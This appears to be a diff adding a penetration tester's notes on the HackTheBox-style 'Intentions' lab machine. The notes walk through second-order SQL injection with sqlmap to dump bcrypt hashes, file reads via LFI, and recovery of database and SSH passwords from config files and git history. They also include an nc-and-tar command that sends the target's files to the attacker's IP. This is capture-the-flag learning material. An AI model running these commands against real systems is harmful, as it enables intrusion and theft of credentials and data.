@@ -1,0 +1,41 @@
+The website has a few areas that can be edited by the user:
+	username, email, password, genres
+	
+Genres while it's not a trivial SQLI Vector, you can save requests that deal with setting
+the genre via burp, for this SQLI we need the genre.req and the feed.req ==> https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap
+
+sqlmap -r genres.req --second-req feed.req --level 5 --risk 3 --batch --tamper=space2comment ==> this will be the first hit with sqlmap
+
+sqlmap -r genres.req --second-req feed.req --level 5 --risk 3 --batch --tamper=space2comment --dump ==> gives us a list of all the users and their hashes [bcrypt]
+
+steve@intentions.htb:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
+greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
+
+Using the LFI.req we can fetch files from the file system; we can enumerate web configs to find the root dir of the site
+/var/www/html/intentions/public ==> ROOT DIR
+
+https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/ ==> RCE AID
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=intentions
+DB_USERNAME=laravel
+DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
+
+mysql -h localhost -u laravel -p -D intentions ==> pass:02mDWOgsOga03G385!!3Plcx
+
+======= NC transfer folder =========
+nc -lvnp 9001 | tar -x ==> Attacker
+tar -c * | nc 10.10.14.208 9001 ==> Shell Terminal
+** NOTE ** --> Wait a good chunk of minutes to ensure all the files are sent through NC
+====================================
+
+After transfering the git repo into our local machine, we can use git log to view all the commits that have
+been pushed. Then using git show <COMMIT> we can view the contents of the commit to find any important information, such as...
+
+$res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+
+SSH ==> greg@intentions.htb:Gr3g1sTh3B3stDev3l0per!1998!
+------------------------------------------------------------------------------
+/opt/scanner/scanner -d /home/greg -h /home/greg/testHash.test
